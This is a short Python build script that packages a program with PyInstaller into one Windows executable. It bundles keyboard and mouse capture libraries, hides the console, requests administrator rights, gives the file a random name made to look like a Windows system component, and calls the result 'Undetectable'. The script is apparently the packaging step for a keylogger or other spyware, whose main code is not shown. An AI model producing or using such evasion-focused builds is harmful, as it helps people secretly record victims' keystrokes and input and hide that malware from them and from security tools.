import PyInstaller.__main__
import os
import random

# Use completely random names that look like system files
legit_prefixes = ['sys', 'win', 'ms', 'nt', 'kb', 'ie', 'dx']
legit_suffixes = ['host', 'svc', 'mgr', 'dll', 'sys', 'drv']
random_name = random.choice(legit_prefixes) + random.choice(legit_suffixes) + str(random.randint(100, 999))

PyInstaller.__main__.run([
    'main.py',
    '--onefile',
    '--noconsole',
    '--windowed',
    '--hidden-import=pynput.keyboard._win32',
    '--hidden-import=pynput.mouse._win32',
    '--hidden-import=webview',
    '--hidden-import=flask',
    '--hidden-import=google.generativeai',
    f'--name={random_name}',
    '--distpath=.',
    '--clean',
    '--uac-admin',
    '--add-data=.;.',
])

print(f"Undetectable executable: {random_name}.exe")
print("All components integrated into single file")